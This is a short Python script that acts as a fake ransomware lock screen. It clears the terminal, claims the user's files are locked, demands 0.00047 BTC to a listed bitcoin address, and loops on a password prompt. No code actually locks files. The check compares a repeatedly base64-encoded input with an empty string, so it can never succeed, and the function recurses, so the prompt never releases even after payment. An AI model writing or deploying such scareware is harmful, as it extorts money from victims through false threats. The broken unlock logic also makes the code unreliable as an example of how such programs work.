import os, sys, base64, subprocess, platform

o = 1
def clear():
    if platform.system() == "Windows":
        subprocess.Popen("cls",
                         shell=True).communicate()
    else:  # Linux and Mac
        print("\033c", end="")

def pas():
    clear()
    print("your Files is locked")
    print("sent 0.00047BTC to unlock")
    print("bitcoin : 3BbN5nbE16hVNmRGnfp3HhxnZo3jCPbTEa")
    print("a small payment will be the Password")
    print("")
    message = str(input("Password : "))
    if str(message) == "^c" or str(message) == "^C":
        pas()
    else:
        message_bytes = message.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        for i in range(1, 150):
            message_bytes = base64_message.encode('ascii')
            base64_bytes = base64.b64encode(message_bytes)
            base64_message = base64_bytes.decode('ascii')

            if str(base64_message) == "":
                clear()
                os.system("cd $HOME")
                os.system("figlet unlockek")
                sys.exit()

            elif i == 24:
                pas()
pas()
